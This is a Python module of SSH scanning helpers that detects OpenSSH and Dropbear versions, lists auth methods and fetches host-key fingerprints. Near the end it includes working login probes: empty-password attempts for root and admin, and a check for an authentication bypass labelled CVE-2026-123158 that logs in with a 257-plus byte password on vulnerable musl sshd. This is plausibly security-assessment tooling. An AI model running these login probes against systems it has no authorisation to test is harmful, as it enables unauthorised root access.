#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SSH Detectors - Helpers pour détecter des serveurs SSH
"""

import re
import secrets
from typing import List, Optional


def detect_openssh(banner: str) -> Optional[str]:
    """Détecte OpenSSH et retourne la version, ou None"""
    if not banner:
        return None
    match = re.search(r'OpenSSH[_-]([\d.]+)', banner, re.IGNORECASE)
    return match.group(1) if match else None


def detect_dropbear(banner: str) -> Optional[str]:
    """Détecte Dropbear SSH et retourne la version, ou None"""
    if not banner:
        return None
    match = re.search(r'dropbear_([\d.]+)', banner, re.IGNORECASE)
    return match.group(1) if match else None


def probe_ssh_auth_methods(
    host: str,
    port: int = 22,
    timeout: float = 8.0,
    username: str = "root",
) -> dict:
    """
    List SSH userauth methods offered (NSE ssh-auth-methods).
    Uses Paramiko when available; otherwise returns banner-only fallback.
    """
    result = {
        "detected": False,
        "banner": "",
        "methods": [],
        "error": "",
    }
    try:
        import paramiko
    except ImportError:
        banner_info = probe_ssh_banner(host, port, timeout)
        result["banner"] = banner_info.get("banner") or ""
        result["detected"] = bool(banner_info.get("detected"))
        result["error"] = "paramiko_required_for_auth_methods"
        return result

    class _IgnorePolicy(paramiko.MissingHostKeyPolicy):
        def missing_host_key(self, client, hostname, key):
            return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(_IgnorePolicy())
    transport = None
    try:
        transport = paramiko.Transport((host, int(port)))
        transport.banner_timeout = timeout
        transport.auth_timeout = timeout
        transport.connect(username=username)
    except paramiko.AuthenticationException:
        # Expected — we only want the offered methods list
        pass
    except Exception as exc:
        # connect() may raise before auth; try start_client path
        try:
            if transport is None:
                transport = paramiko.Transport((host, int(port)))
            if not transport.is_active():
                transport.start_client(timeout=timeout)
        except Exception as exc2:
            result["error"] = str(exc2)[:200]
            return result
    try:
        if transport is None:
            result["error"] = "no_transport"
            return result
        if not transport.is_active():
            transport.start_client(timeout=timeout)
        banner = transport.remote_version or ""
        result["banner"] = banner
        result["detected"] = True
        try:
            methods = transport.auth_none(username)
        except paramiko.BadAuthenticationType as bat:
            methods = list(bat.allowed_types or [])
        except paramiko.AuthenticationException:
            methods = []
        except Exception as exc:
            # Some servers accept none auth
            methods = []
            result["error"] = str(exc)[:120]
        result["methods"] = [str(m) for m in (methods or [])]
        return result
    except Exception as exc:
        result["error"] = str(exc)[:200]
        return result
    finally:
        try:
            if transport is not None:
                transport.close()
        except Exception:
            pass
        try:
            client.close()
        except Exception:
            pass


def probe_ssh_banner(host: str, port: int = 22, timeout: float = 5.0) -> dict:
    """Read SSH banner and classify OpenSSH/Dropbear."""
    import socket

    result = {
        "detected": False,
        "banner": "",
        "product": "",
        "version": "",
        "error": "",
    }
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(timeout)
        sock.connect((host, int(port)))
        data = sock.recv(256)
        if not data:
            result["error"] = "empty_banner"
            return result
        banner = data.decode("utf-8", errors="replace").strip()
        result["banner"] = banner
        if not banner.upper().startswith("SSH-"):
            result["error"] = "not_ssh_protocol"
            return result
        result["detected"] = True
        openssh = detect_openssh(banner)
        if openssh:
            result["product"] = "openssh"
            result["version"] = openssh
            return result
        dropbear = detect_dropbear(banner)
        if dropbear:
            result["product"] = "dropbear"
            result["version"] = dropbear
            return result
        result["product"] = "ssh"
        return result
    except Exception as exc:
        result["error"] = str(exc)
        return result
    finally:
        sock.close()


def probe_ssh_hostkey(host: str, port: int = 22, timeout: float = 8.0) -> dict:
    """
    Retrieve SSH host key type + fingerprints (NSE ssh-hostkey).
    Requires Paramiko.
    """
    result = {
        "detected": False,
        "banner": "",
        "key_type": "",
        "fingerprint_md5": "",
        "fingerprint_sha256": "",
        "bits": 0,
        "error": "",
    }
    try:
        import hashlib
        import base64

        import paramiko
    except ImportError:
        banner = probe_ssh_banner(host, port, timeout)
        result["banner"] = banner.get("banner") or ""
        result["detected"] = bool(banner.get("detected"))
        result["error"] = "paramiko_required"
        return result

    transport = None
    try:
        transport = paramiko.Transport((host, int(port)))
        transport.banner_timeout = timeout
        transport.start_client(timeout=timeout)
        result["banner"] = transport.remote_version or ""
        key = transport.get_remote_server_key()
        if key is None:
            result["error"] = "no_host_key"
            return result
        result["detected"] = True
        result["key_type"] = key.get_name()
        try:
            result["bits"] = int(key.get_bits())
        except Exception:
            result["bits"] = 0
        blob = key.asbytes()
        md5 = hashlib.md5(blob).hexdigest()
        result["fingerprint_md5"] = ":".join(md5[i : i + 2] for i in range(0, len(md5), 2))
        sha = hashlib.sha256(blob).digest()
        result["fingerprint_sha256"] = "SHA256:" + base64.b64encode(sha).decode("ascii").rstrip("=")
        # Flag weak keys
        weak = False
        if result["key_type"] in ("ssh-dss", "ssh-rsa") and result["bits"] and result["bits"] < 2048:
            weak = True
        if result["key_type"] == "ssh-dss":
            weak = True
        result["weak"] = weak
        return result
    except Exception as exc:
        result["error"] = str(exc)[:200]
        return result
    finally:
        try:
            if transport is not None:
                transport.close()
        except Exception:
            pass


def probe_ssh_empty_password(
    host: str,
    port: int = 22,
    timeout: float = 8.0,
    usernames: Optional[list] = None,
) -> dict:
    """
    Try empty-password authentication for a short username list.
    Returns success=True and username on first hit.
    """
    result = {
        "detected": False,
        "success": False,
        "username": "",
        "banner": "",
        "error": "",
        "tried": [],
    }
    try:
        import paramiko
    except ImportError:
        banner = probe_ssh_banner(host, port, timeout)
        result["banner"] = banner.get("banner") or ""
        result["detected"] = bool(banner.get("detected"))
        result["error"] = "paramiko_required"
        return result

    users = [str(u).strip() for u in (usernames or ["root", "admin"]) if str(u).strip()]
    if not users:
        users = ["root"]

    for username in users:
        result["tried"].append(username)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host,
                port=int(port),
                username=username,
                password="",
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False,
                auth_timeout=timeout,
                banner_timeout=timeout,
            )
            transport = client.get_transport()
            result["detected"] = True
            result["success"] = True
            result["username"] = username
            result["banner"] = (transport.remote_version if transport else "") or ""
            try:
                client.close()
            except Exception:
                pass
            return result
        except paramiko.AuthenticationException:
            result["detected"] = True
            try:
                client.close()
            except Exception:
                pass
            continue
        except Exception as exc:
            result["error"] = str(exc)[:200]
            try:
                client.close()
            except Exception:
                pass
            continue
    if not result["detected"]:
        banner = probe_ssh_banner(host, port, min(timeout, 5.0))
        result["banner"] = banner.get("banner") or ""
        result["detected"] = bool(banner.get("detected"))
    return result


_SSHOLE_MIN_PASSWORD = 257
_SSHOLE_MAX_PASSWORD = 1024
_SSHOLE_DEFAULT_LENGTH = 300
_SSHOLE_FIXED_VERSION = (10, 6, 2)


def _sshhole_clamp_length(length: int) -> int:
    return max(_SSHOLE_MIN_PASSWORD, min(int(length or _SSHOLE_DEFAULT_LENGTH), _SSHOLE_MAX_PASSWORD))


def _parse_openssh_version_tuple(version: str):
    if not version:
        return None
    text = str(version).strip().lower().replace("_", ".")
    match = re.match(r"^(\d+)\.(\d+)(?:\.(\d+))?(?:p(\d+))?", text)
    if not match:
        return None
    major, minor = int(match.group(1)), int(match.group(2))
    micro = int(match.group(3) or 0)
    patch = int(match.group(4) or 0)
    if patch and micro == 0:
        micro = patch
    return (major, minor, micro)


def openssh_banner_at_or_past_sshole_fix(banner: str) -> Optional[bool]:
    version = detect_openssh(banner or "")
    if not version:
        return None
    tup = _parse_openssh_version_tuple(version)
    if not tup:
        return None
    return tup >= _SSHOLE_FIXED_VERSION


def _ssh_password_login(
    host: str,
    port: int,
    username: str,
    password: str,
    *,
    timeout: float = 10.0,
) -> dict:
    result = {"accepted": False, "banner": "", "error": ""}
    try:
        import paramiko
    except ImportError:
        result["error"] = "paramiko_required"
        return result

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=int(port),
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            auth_timeout=timeout,
            banner_timeout=timeout,
        )
        transport = client.get_transport()
        result["accepted"] = True
        result["banner"] = (transport.remote_version if transport else "") or ""
        return result
    except paramiko.AuthenticationException:
        try:
            transport = client.get_transport()
            if transport:
                result["banner"] = transport.remote_version or ""
        except Exception:
            pass
        return result
    except Exception as exc:
        result["error"] = str(exc)[:240]
        return result
    finally:
        try:
            client.close()
        except Exception:
            pass


def probe_openssh_sshole_bypass(
    host: str,
    port: int = 22,
    *,
    username: str = "root",
    password_length: int = _SSHOLE_DEFAULT_LENGTH,
    timeout: float = 10.0,
) -> dict:
    """
    CVE-2026-123158: short control password must fail; 257+ byte password succeeds on vulnerable musl sshd.
    """
    pw_len = _sshhole_clamp_length(password_length)
    out = {
        "detected": False,
        "vulnerable": False,
        "banner": "",
        "openssh_version": "",
        "username": username,
        "password_length": pw_len,
        "error": "",
    }
    short = _ssh_password_login(host, port, username, secrets.token_hex(16), timeout=timeout)
    if short.get("error") == "paramiko_required":
        out["error"] = "paramiko_required"
        return out
    if short.get("error"):
        out["error"] = short["error"]
        return out
    banner = str(short.get("banner") or "")
    out["banner"] = banner
    out["detected"] = bool(banner) or not short.get("accepted")
    version = detect_openssh(banner) or ""
    out["openssh_version"] = version
    if version and openssh_banner_at_or_past_sshole_fix(banner) is True:
        out["error"] = "openssh_banner_at_or_past_fix"
        return out
    if short.get("accepted"):
        out["error"] = "short_password_accepted"
        return out
    long_pw = "A" * pw_len
    long_res = _ssh_password_login(host, port, username, long_pw, timeout=timeout)
    if long_res.get("error"):
        out["error"] = long_res["error"]
        return out
    if not out["banner"]:
        out["banner"] = str(long_res.get("banner") or "")
    out["vulnerable"] = bool(long_res.get("accepted"))
    return out


def probe_openssh_sshole_bypass_users(
    host: str,
    port: int = 22,
    *,
    usernames: Optional[List[str]] = None,
    password_length: int = _SSHOLE_DEFAULT_LENGTH,
    timeout: float = 10.0,
) -> dict:
    users = [str(u).strip() for u in (usernames or ["root", "alpine"]) if str(u).strip()]
    aggregate = {
        "vulnerable": False,
        "detected": False,
        "banner": "",
        "openssh_version": "",
        "username": "",
        "tried": [],
        "error": "",
    }
    for user in users:
        aggregate["tried"].append(user)
        info = probe_openssh_sshole_bypass(
            host,
            port,
            username=user,
            password_length=password_length,
            timeout=timeout,
        )
        if info.get("error") == "paramiko_required":
            aggregate["error"] = "paramiko_required"
            return aggregate
        if info.get("banner"):
            aggregate["banner"] = info["banner"]
        if info.get("openssh_version"):
            aggregate["openssh_version"] = info["openssh_version"]
        aggregate["detected"] = aggregate["detected"] or bool(info.get("detected"))
        if info.get("vulnerable"):
            aggregate["vulnerable"] = True
            aggregate["username"] = user
            aggregate["password_length"] = info.get("password_length")
            return aggregate
        if info.get("error") == "openssh_banner_at_or_past_fix":
            aggregate["error"] = info["error"]
            return aggregate
    if not aggregate["error"]:
        aggregate["error"] = "no_bypass"
    return aggregate
